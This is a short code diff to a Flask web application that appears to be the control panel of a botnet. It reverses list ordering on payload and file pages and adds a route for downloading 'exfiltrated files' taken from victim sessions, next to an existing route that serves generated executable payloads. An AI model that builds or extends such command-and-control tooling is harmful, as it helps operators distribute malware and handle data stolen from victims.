@@ -33,7 +33,7 @@ def sessions():
 def payloads():
 	payloads = payload_dao.get_user_payloads(current_user.id)
 	return render_template("payloads.html", 
-							payloads=payloads, 
+							payloads=payloads[::-1], 
 							owner=current_user.username)
 
 
@@ -42,7 +42,7 @@ def payloads():
 def files():
 	user_files = file_dao.get_user_files(current_user.id)
 	return render_template("files.html", 
-							files=user_files, 
+							files=user_files[::-1], 
 							owner=current_user.username)
 
 
@@ -72,3 +72,8 @@ def tasks():
 @login_required
 def download_payload(user, filename):	
 	return send_from_directory(os.path.join(current_app.config['OUTPUT_DIR'], user, 'exe'), filename, as_attachment=True)
+
+@root.route("/exfiltratedfiles/<user>/<session>/<filename>")
+@login_required
+def download_file(user, session, filename):	
+	return send_from_directory(os.path.join(os.path.abspath('botnet/exfiltratedfiles'), user, session), filename, as_attachment=True)
